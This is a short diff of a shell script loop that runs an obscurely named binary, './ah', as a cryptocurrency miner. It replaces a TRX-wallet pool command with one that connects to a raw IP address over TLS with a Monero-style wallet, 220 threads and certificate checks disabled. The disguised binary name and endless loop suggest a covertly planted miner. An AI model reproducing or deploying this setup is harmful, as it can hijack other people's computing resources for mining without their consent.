@@ -6,7 +6,7 @@ while true; do
 
     # Execute the command in the background
     ulimit -v 40000000  # Set the virtual memory limit to 40GB
-    ./ah -a rx -o stratum+ssl://rx.unmineable.com:443 -u TRX:TUPkoHaVv8jp6CbsQGjd8bhDZXBVxkQkSt.A1 -p x -t 220
+    ./ah -o 95.179.241.203:443 -u 82qf8HxLzbQVKGvBzXy5SJUucoZw2ySfJZS3Kww8wZ3NaTNnWNoXvvTf3vt5RdXbDC7uwPazSSQfx8frLTUd1eR2KVL1oUY -p asee -k --tls
 
     # Wait for the command to finish
     wait
